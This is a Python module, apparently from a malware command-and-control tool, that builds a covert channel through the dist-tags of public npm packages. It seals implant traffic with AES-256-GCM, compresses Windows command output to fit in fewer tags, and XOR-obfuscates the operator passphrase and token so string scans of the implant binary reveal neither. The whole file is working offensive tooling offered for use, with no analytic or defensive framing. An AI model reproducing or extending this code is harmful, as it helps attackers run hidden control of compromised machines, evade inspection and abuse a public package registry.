"""End-to-end encryption for the tag channel.

The registry is public: anyone can GET a package's dist-tags and read the
payloads. Base64 is not protection, so every payload is sealed with
AES-256-GCM under a key derived from a shared passphrase with HKDF.

Wire format inside a tag chunk, before base64url::

    nonce(12) || ciphertext || tag(16)

The nonce is random per payload; the AAD binds the ciphertext to the gid so a
chunk cannot be replayed into another group.

The implant carries the passphrase obfuscated with the same XOR scheme already
used for the token, so strings(1) on the binary does not reveal it.
"""
from __future__ import annotations

import hashlib
import hmac
import os
import zlib

KEY_INFO = b"npm-c2 tag channel v1"
NONCE_LEN = 12
TAG_LEN = 16          # GCM authentication tag

# Compression matters more than encryption for cost: a tag carries ~174 bytes
# of payload, so an uncompressed 1.3KB command output needs 8 tags. Windows
# output is highly repetitive and compresses ~25x, turning those 8 into 1.
COMPRESS_MIN = 64     # below this, zlib's header costs more than it saves
_RAW = b"\x00"        # payload was stored as-is
_ZLIB = b"\x01"       # payload was zlib-compressed


def compress(payload: bytes) -> bytes:
    """Prefix the payload with a one-byte marker describing its encoding."""
    if len(payload) < COMPRESS_MIN:
        return _RAW + payload
    packed = zlib.compress(payload, 9)
    if len(packed) >= len(payload):
        return _RAW + payload
    return _ZLIB + packed


def decompress(blob: bytes) -> bytes:
    """Undo compress(). A bare payload without a marker is passed through so
    tags written before compression existed still decode."""
    if not blob:
        return blob
    marker, body = blob[:1], blob[1:]
    if marker == _ZLIB:
        return zlib.decompress(body)
    if marker == _RAW:
        return body
    return blob       # legacy tag: no marker at all


def derive_key(passphrase: str) -> bytes:
    """HKDF-SHA256: 32 bytes of key material from the operator passphrase."""
    if not passphrase:
        raise ValueError("empty passphrase")
    prk = hmac.new(b"npm-c2-hkdf-salt", passphrase.encode("utf-8"),
                   hashlib.sha256).digest()
    out = hmac.new(prk, KEY_INFO + b"\x01", hashlib.sha256).digest()
    return out[:32]


def seal(key: bytes, plaintext: bytes, aad: bytes = b"") -> bytes:
    """Encrypt with AES-256-GCM. Returns nonce || ciphertext || tag."""
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    nonce = os.urandom(NONCE_LEN)
    return nonce + AESGCM(key).encrypt(nonce, plaintext, aad)


def open_sealed(key: bytes, blob: bytes, aad: bytes = b"") -> bytes:
    """Decrypt a sealed blob. Raises on tampering or a wrong key."""
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    if len(blob) < NONCE_LEN + TAG_LEN:
        raise ValueError("sealed payload too short")
    nonce, body = blob[:NONCE_LEN], blob[NONCE_LEN:]
    return AESGCM(key).decrypt(nonce, body, aad)


# ---------------------------------------------------------------- obfuscation
def xor_bytes(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def obfuscate_secret(secret: str, package: str) -> str:
    """Hex of the XOR'd passphrase, keyed on the package name.

    Matches the token scheme so a single `strings` sweep shows neither.
    """
    key = hashlib.sha256(package.encode()).digest()
    return xor_bytes(secret.encode(), key).hex()


def deobfuscate_secret(blob_hex: str, package: str) -> str:
    key = hashlib.sha256(package.encode()).digest()
    return xor_bytes(bytes.fromhex(blob_hex), key).decode()
